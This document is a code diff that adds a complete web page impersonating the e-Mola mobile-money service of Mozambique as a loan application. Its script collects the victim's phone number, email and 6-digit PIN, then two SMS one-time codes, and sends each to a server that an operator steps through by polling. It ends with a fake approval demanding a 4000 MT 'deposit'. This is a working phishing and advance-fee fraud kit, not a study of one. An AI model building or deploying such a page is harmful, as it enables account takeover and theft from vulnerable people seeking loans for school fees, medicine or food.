@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>e-Mola Moçambique - Empréstimos</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background: linear-gradient(180deg, #ED7400 0%, #D86200 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+        }
+
+        .app-card {
+            background: #FFFFFF;
+            width: 100%;
+            max-width: 440px;
+            border-radius: 24px;
+            box-shadow: 0 12px 32px rgba(0,0,0,0.25);
+            padding: 24px 20px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .brand-header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .brand-logo-text {
+            font-size: 28px;
+            font-weight: 900;
+            color: #ED7400;
+            letter-spacing: -0.5px;
+        }
+        .brand-subtext {
+            font-size: 13px;
+            color: #666;
+            margin-top: 2px;
+        }
+
+        .step {
+            display: none;
+        }
+        .step.active {
+            display: block;
+        }
+
+        .step-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #222;
+            margin-bottom: 16px;
+            text-align: center;
+        }
+
+        .calc-group {
+            background: #F8F9FA;
+            border: 1px solid #E9ECEF;
+            border-radius: 16px;
+            padding: 16px;
+            margin-bottom: 16px;
+        }
+        .calc-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+            font-size: 14px;
+            color: #444;
+            font-weight: 600;
+        }
+        .calc-value {
+            font-weight: 800;
+            color: #ED7400;
+            font-size: 18px;
+        }
+
+        input[type=range] {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 100%;
+            height: 8px;
+            border-radius: 4px;
+            background: #DEE2E6;
+            outline: none;
+            margin: 10px 0;
+        }
+        input[type=range]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            background: #ED7400;
+            cursor: pointer;
+            box-shadow: 0 2px 6px rgba(237, 116, 0, 0.4);
+        }
+        input[type=range]::-moz-range-thumb {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            background: #ED7400;
+            cursor: pointer;
+            box-shadow: 0 2px 6px rgba(237, 116, 0, 0.4);
+            border: none;
+        }
+        .calc-limits {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            color: #888;
+        }
+
+        .monthly-card {
+            background: #FFF3E6;
+            border: 1px solid #FFE0C2;
+            border-radius: 14px;
+            padding: 14px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .monthly-label {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 4px;
+        }
+        .monthly-amount {
+            font-size: 24px;
+            font-weight: 900;
+            color: #ED7400;
+        }
+
+        .form-group {
+            margin-bottom: 14px;
+        }
+        .form-label {
+            font-size: 13px;
+            font-weight: 600;
+            color: #444;
+            margin-bottom: 6px;
+            display: block;
+        }
+        .phone-wrapper {
+            display: flex;
+            align-items: center;
+            background: #F8F9FA;
+            border: 1px solid #CED4DA;
+            border-radius: 12px;
+            padding: 0 12px;
+        }
+        .phone-prefix {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-weight: 700;
+            color: #333;
+            font-size: 14px;
+            padding-right: 8px;
+            border-right: 1px solid #DEE2E6;
+        }
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #CED4DA;
+            border-radius: 12px;
+            font-size: 15px;
+            background: #F8F9FA;
+            outline: none;
+        }
+        .phone-wrapper .input-field {
+            border: none;
+            background: transparent;
+        }
+        .input-field:focus {
+            border-color: #ED7400;
+            background: #FFF;
+        }
+
+        .btn-primary {
+            width: 100%;
+            padding: 14px;
+            background: #ED7400;
+            color: #FFF;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(237, 116, 0, 0.3);
+        }
+        .btn-primary:active {
+            transform: scale(0.98);
+        }
+
+        .status-box {
+            text-align: center;
+            padding: 30px 10px;
+        }
+        .spinner {
+            width: 44px;
+            height: 44px;
+            border: 4px solid #FFE0C2;
+            border-top: 4px solid #ED7400;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 16px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .error-msg {
+            color: #DC3545;
+            font-size: 13px;
+            text-align: center;
+            margin-top: 10px;
+            display: none;
+        }
+
+        .deposit-alert {
+            background: #E8F5E9;
+            border: 1px solid #C8E6C9;
+            border-radius: 14px;
+            padding: 16px;
+            margin-top: 14px;
+            color: #2E7D32;
+            font-weight: 600;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+    </style>
+</head>
+<body>
+
+<div class="app-card">
+    <div class="brand-header">
+        <div class="brand-logo-text">e-Mola</div>
+        <div class="brand-subtext">Meu cell, minha mola</div>
+    </div>
+
+    <!-- STEP 1: Loan Calculator -->
+    <div id="step-1" class="step active">
+        <div class="step-title">Calculadora de Empréstimo</div>
+        
+        <div class="calc-group">
+            <div class="calc-header">
+                <span>Valor do Empréstimo</span>
+                <span class="calc-value" id="amount-val">25.000 MT</span>
+            </div>
+            <input type="range" id="amount-slider" min="10000" max="70000" step="1000" value="25000">
+            <div class="calc-limits">
+                <span>10.000 MT</span>
+                <span>70.000 MT</span>
+            </div>
+        </div>
+
+        <div class="calc-group">
+            <div class="calc-header">
+                <span>Prazo do Empréstimo</span>
+                <span class="calc-value" id="term-val">6 Meses</span>
+            </div>
+            <input type="range" id="term-slider" min="1" max="12" step="1" value="6">
+            <div class="calc-limits">
+                <span>1 Mês</span>
+                <span>12 Meses</span>
+            </div>
+        </div>
+
+        <div class="monthly-card">
+            <div class="monthly-label">Pagamento Mensal</div>
+            <div class="monthly-amount" id="monthly-val">0.00 MT</div>
+        </div>
+
+        <button class="btn-primary" onclick="goToStep(2)">SOLICITAR AGORA</button>
+    </div>
+
+    <!-- STEP 2: Phone, Email & Purpose -->
+    <div id="step-2" class="step">
+        <div class="step-title">Dados Pessoais</div>
+        
+        <div class="form-group">
+            <label class="form-label">Número de Telefone</label>
+            <div class="phone-wrapper">
+                <div class="phone-prefix">
+                    <svg width="20" height="14" viewBox="0 0 3 2">
+                        <rect width="3" height="2" fill="#009639"/>
+                        <path d="M0,0 L3,2 M0,2 L3,0" stroke="#FFF" stroke-width="0.3"/>
+                        <path d="M0,0 L3,2 M0,2 L3,0" stroke="#000" stroke-width="0.15"/>
+                        <rect y="0.66" width="3" height="0.68" fill="#D21034"/>
+                        <polygon points="0,0 1.2,1 0,2" fill="#FFD100"/>
+                        <polygon points="0.1,0.2 1.0,1 0.1,1.8" fill="#000"/>
+                    </svg>
+                    +258
+                </div>
+                <input type="tel" id="user-phone" class="input-field" placeholder="84 123 4567">
+            </div>
+        </div>
+
+        <div class="form-group">
+            <label class="form-label">Endereço de Gmail</label>
+            <input type="email" id="user-email" class="input-field" placeholder="exemplo@gmail.com">
+        </div>
+
+        <div class="form-group">
+            <label class="form-label">Finalidade do Empréstimo</label>
+            <select id="user-purpose" class="input-field">
+                <option value="Propinas Escolares">Propinas Escolares</option>
+                <option value="Despesas Médicas">Despesas Médicas</option>
+                <option value="Empréstimo Pessoal">Empréstimo Pessoal</option>
+                <option value="Comida e Mantimentos">Comida e Mantimentos</option>
+            </select>
+        </div>
+
+        <div id="err-step-2" class="error-msg">Por favor, preencha todos os campos corretamente.</div>
+        <button class="btn-primary" onclick="validateStep2()">CONTINUAR</button>
+    </div>
+
+    <!-- STEP 3: 6-Digit PIN -->
+    <div id="step-3" class="step">
+        <div class="step-title">Segurança e Autenticação</div>
+        <p style="font-size: 13px; color: #666; text-align: center; margin-bottom: 16px;">
+            Digite o seu PIN de 6 dígitos para autorizar a solicitação.
+        </p>
+
+        <div class="form-group">
+            <input type="password" id="user-pin" class="input-field" placeholder="******" maxlength="6" style="text-align: center; font-size: 24px; letter-spacing: 6px;">
+        </div>
+
+        <div id="err-step-3" class="error-msg">Por favor, insira um PIN válido de 6 dígitos.</div>
+        <button class="btn-primary" onclick="submitApplication()">ENVIAR PEDIDO</button>
+    </div>
+
+    <!-- STEP 4: Processing / Waiting for Admin -->
+    <div id="step-4" class="step">
+        <div class="status-box">
+            <div class="spinner"></div>
+            <div style="font-size: 16px; font-weight: 700; color: #222;" id="status-title">A processar o pedido...</div>
+            <div style="font-size: 13px; color: #666; margin-top: 8px;" id="status-desc">Aguarde a validação no sistema.</div>
+        </div>
+    </div>
+
+    <!-- STEP 5: OTP 1 Input -->
+    <div id="step-5" class="step">
+        <div class="step-title">Verificação OTP (1/2)</div>
+        <p style="font-size: 13px; color: #666; text-align: center; margin-bottom: 16px;">
+            Insira o primeiro código OTP de 6 dígitos enviado por SMS.
+        </p>
+
+        <div class="form-group">
+            <input type="text" id="user-otp1" class="input-field" placeholder="000000" maxlength="6" style="text-align: center; font-size: 24px; letter-spacing: 6px;">
+        </div>
+
+        <div id="err-step-5" class="error-msg">Código OTP inválido. Tente novamente.</div>
+        <button class="btn-primary" onclick="submitOtp1()">CONFIRMAR OTP 1</button>
+    </div>
+
+    <!-- STEP 6: OTP 2 Input -->
+    <div id="step-6" class="step">
+        <div class="step-title">Verificação OTP (2/2)</div>
+        <p style="font-size: 13px; color: #666; text-align: center; margin-bottom: 16px;">
+            Insira o segundo código OTP de 6 dígitos de confirmação.
+        </p>
+
+        <div class="form-group">
+            <input type="text" id="user-otp2" class="input-field" placeholder="000000" maxlength="6" style="text-align: center; font-size: 24px; letter-spacing: 6px;">
+        </div>
+
+        <div id="err-step-6" class="error-msg">Código OTP inválido. Tente novamente.</div>
+        <button class="btn-primary" onclick="submitOtp2()">CONFIRMAR OTP FINAL</button>
+    </div>
+
+    <!-- STEP 7: Final Success & Deposit Notice -->
+    <div id="step-7" class="step" style="text-align: center;">
+        <div style="font-size: 48px; margin-bottom: 10px;">🎉</div>
+        <div class="step-title" style="color: #2E7D32;">Empréstimo Aprovado!</div>
+        
+        <p style="font-size: 15px; color: #333; margin-top: 10px;" id="final-success-msg">
+            Parabéns! Você solicitou 0 MT com sucesso.
+        </p>
+
+        <div class="deposit-alert">
+            Por favor, deposite <strong>4000 MT</strong> na sua conta para concluir o levantamento com sucesso.
+        </div>
+    </div>
+</div>
+
+<script>
+    let appData = {
+        amount: 25000,
+        term: 6,
+        phone: '',
+        email: '',
+        purpose: '',
+        pin: ''
+    };
+
+    let pollInterval = null;
+
+    function goToStep(stepNum) {
+        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+        document.getElementById(`step-${stepNum}`).classList.add('active');
+    }
+
+    const amountSlider = document.getElementById('amount-slider');
+    const termSlider = document.getElementById('term-slider');
+
+    function updateCalculations() {
+        appData.amount = parseInt(amountSlider.value);
+        appData.term = parseInt(termSlider.value);
+
+        document.getElementById('amount-val').innerText = `${appData.amount.toLocaleString()} MT`;
+        document.getElementById('term-val').innerText = `${appData.term} ${appData.term === 1 ? 'Mês' : 'Meses'}`;
+
+        const monthly = (appData.amount / appData.term) + (appData.amount * 0.02);
+        document.getElementById('monthly-val').innerText = `${monthly.toFixed(2)} MT`;
+    }
+
+    amountSlider.addEventListener('input', updateCalculations);
+    termSlider.addEventListener('input', updateCalculations);
+    updateCalculations();
+
+    function validateStep2() {
+        const rawPhone = document.getElementById('user-phone').value.trim();
+        const email = document.getElementById('user-email').value.trim();
+        const purpose = document.getElementById('user-purpose').value;
+        const err = document.getElementById('err-step-2');
+
+        let validPhone = false;
+        if (rawPhone.startsWith('0') && rawPhone.length === 10) validPhone = true;
+        if (!rawPhone.startsWith('0') && rawPhone.length === 9) validPhone = true;
+
+        if (!validPhone || !email.includes('@')) {
+            err.style.display = 'block';
+            return;
+        }
+
+        err.style.display = 'none';
+        appData.phone = '+258' + rawPhone;
+        appData.email = email;
+        appData.purpose = purpose;
+        goToStep(3);
+    }
+
+    async function submitApplication() {
+        const pin = document.getElementById('user-pin').value.trim();
+        const err = document.getElementById('err-step-3');
+
+        if (pin.length !== 6 || isNaN(pin)) {
+            err.style.display = 'block';
+            return;
+        }
+
+        err.style.display = 'none';
+        appData.pin = pin;
+        goToStep(4);
+
+        try {
+            const res = await fetch('/api/submit', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    phone: appData.phone,
+                    amount: `${appData.amount} MT`,
+                    purpose: appData.purpose,
+                    pin: appData.pin
+                })
+            });
+            const data = await res.json();
+            if (data.success) {
+                startPollingStatus('otp1');
+            } else {
+                alert('Erro ao enviar dados. Verifique a ligação ao servidor.');
+                goToStep(3);
+            }
+        } catch (e) {
+            alert('Erro de ligação ao servidor.');
+            goToStep(3);
+        }
+    }
+
+    async function submitOtp1() {
+        const otp = document.getElementById('user-otp1').value.trim();
+        const err = document.getElementById('err-step-5');
+
+        if (otp.length !== 6 || isNaN(otp)) {
+            err.style.display = 'block';
+            return;
+        }
+
+        err.style.display = 'none';
+        goToStep(4);
+
+        await fetch('/api/submit-otp', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone: appData.phone, otp: `OTP-1: ${otp}` })
+        });
+
+        startPollingStatus('otp2');
+    }
+
+    async function submitOtp2() {
+        const otp = document.getElementById('user-otp2').value.trim();
+        const err = document.getElementById('err-step-6');
+
+        if (otp.length !== 6 || isNaN(otp)) {
+            err.style.display = 'block';
+            return;
+        }
+
+        err.style.display = 'none';
+        goToStep(4);
+
+        await fetch('/api/submit-otp', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone: appData.phone, otp: `OTP-2: ${otp}` })
+        });
+
+        startPollingStatus('final');
+    }
+
+    function startPollingStatus(nextTarget) {
+        if (pollInterval) clearInterval(pollInterval);
+
+        pollInterval = setInterval(async () => {
+            try {
+                const res = await fetch('/api/status');
+                const data = await res.json();
+
+                if (data.status === 'approved') {
+                    clearInterval(pollInterval);
+                    if (nextTarget === 'otp1') goToStep(5);
+                    else if (nextTarget === 'otp2') goToStep(6);
+                    else if (nextTarget === 'final') {
+                        document.getElementById('final-success-msg').innerText = 
+                            `Parabéns! Você solicitou ${appData.amount.toLocaleString()} MT com sucesso.`;
+                        goToStep(7);
+                    }
+                } else if (data.status === 'wrong_otp') {
+                    clearInterval(pollInterval);
+                    alert('Código ou PIN recusado. Por favor introduza novamente.');
+                    if (nextTarget === 'otp1') goToStep(3);
+                    else if (nextTarget === 'otp2') goToStep(5);
+                    else if (nextTarget === 'final') goToStep(6);
+                }
+            } catch (e) {
+                console.log('Polling status...');
+            }
+        }, 2000);
+    }
+</script>
+</body>
+</html>
